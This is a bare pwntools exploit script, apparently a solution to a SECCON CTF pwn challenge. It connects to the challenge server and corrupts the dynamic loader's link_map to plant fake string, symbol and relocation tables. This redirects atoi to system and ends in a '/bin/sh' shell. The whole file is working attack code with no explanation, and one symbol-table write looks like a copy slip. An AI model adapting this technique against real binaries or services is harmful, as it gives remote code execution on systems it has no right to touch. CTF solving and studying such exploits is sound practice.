from pwn import *
import sys

elf = ELF("chall_patched")
libc = ELF("libmod.so")

local = False

if local:
    io = process(elf.path)
else:
    io = remote("simplemod.seccon.games", 7250)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

if local:
    gdb.attach(io, gdb_args = ['-ex', 'init-pwndbg'], gdbscript = '''
        break fini
        ''')

def modify(oft, v):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"offset: ", oft)
    io.sendlineafter(b"value: ", v)

def exit():
    io.sendlineafter(b"> ", b"0")

DT_STRTAB = 5
DT_SYMTAB = 6
DT_JMPREL = 23
DT_FINI_ARRAY = 26
DT_FINI_ARRAYSZ = 28

# offset from gbuf
gotplt_oft = - 0x80
linkmap_oft = 0x1460 + gotplt_oft
linkmap_next_oft = 0x19d0 + gotplt_oft
if local:
    linkmap_oft = 0x11e0 + gotplt_oft
    linkmap_next_oft = 0x1750 + gotplt_oft
dt_strtab_oft = linkmap_oft + 0x40 + 0x08 * DT_STRTAB
dt_symtab_oft = linkmap_oft + 0x40 + 0x08 * DT_SYMTAB
dt_jmprel_oft = linkmap_oft + 0x40 + 0x08 * DT_JMPREL
dt_fini_array_oft = linkmap_oft + 0x40 + 0x08 * DT_FINI_ARRAY
dt_fini_arraysz_oft = linkmap_oft + 0x40 + 0x08 * DT_FINI_ARRAYSZ

# libmod's l_info[DT_STRTAB] points .got.plt addr
modify(str(dt_strtab_oft), str(0xd8))

# make fake string table
## exit_imm
modify(str(0x0), str(u8(b'e')))
modify(str(0x1), str(u8(b'x')))
modify(str(0x2), str(u8(b'i')))
modify(str(0x3), str(u8(b't')))
modify(str(0x4), str(u8(b'_')))
modify(str(0x5), str(u8(b'i')))
modify(str(0x6), str(u8(b'm')))
modify(str(0x7), str(u8(b'm')))

## system
modify(str(0x9), str(u8(b's')))
modify(str(0xa), str(u8(b'y')))
modify(str(0xb), str(u8(b's')))
modify(str(0xc), str(u8(b't')))
modify(str(0xd), str(u8(b'e')))
modify(str(0xe), str(u8(b'm')))

exit_imm_str_oft = 0x0
system_str_oft = 0x9
system_sym_oft = 13

# libmod's l_info[DT_SYMTAB] points .got.plt addr
modify(str(dt_symtab_oft), str(0xd8))

# make fake symbol table
## exit_imm
elf64_sym_size = 0x18
modify(str(elf64_sym_size * 9 + gotplt_oft), str(exit_imm_str_oft - gotplt_oft)) # st_name
modify(str(elf64_sym_size * 9 + gotplt_oft + 4), str(0x12)) # st_info = 0x12
modify(str(elf64_sym_size * 9 + gotplt_oft + 6), str(0xe)) # st_shndx = 0xe
modify(str(elf64_sym_size * 9 + gotplt_oft + 8), str(0x63)) # st_value = 0x1263 <- call __stack_check_failed
modify(str(elf64_sym_size * 9 + gotplt_oft + 9), str(0x12))

## system
modify(str(elf64_sym_size * system_sym_oft + gotplt_oft), str(system_str_oft - gotplt_oft))
modify(str(elf64_sym_size * 9 + gotplt_oft + 4), str(0x12)) # st_info = 0x12

# libmod's l_info[DT_JMPREL] points gbuf addr
modify(str(dt_jmprel_oft), str(str(0xe0)))

# make fake rela table
elf64_rela_size = 0x18
modify(str(elf64_rela_size * 1), str(libc.got["atoi"] & 0xff)) # r_offset
modify(str(elf64_rela_size * 1 + 1), str(libc.got["atoi"] >> 8))
modify(str(elf64_rela_size * 1 + 8), str(0x7))
modify(str(elf64_rela_size * 1 + 12), str(system_sym_oft))

# adjust libc's link map->l_addr for stack alignment
modify(str(linkmap_next_oft), str(0x1b))

exit()

io.sendlineafter(b"> ", b"/bin/sh")

io.interactive()
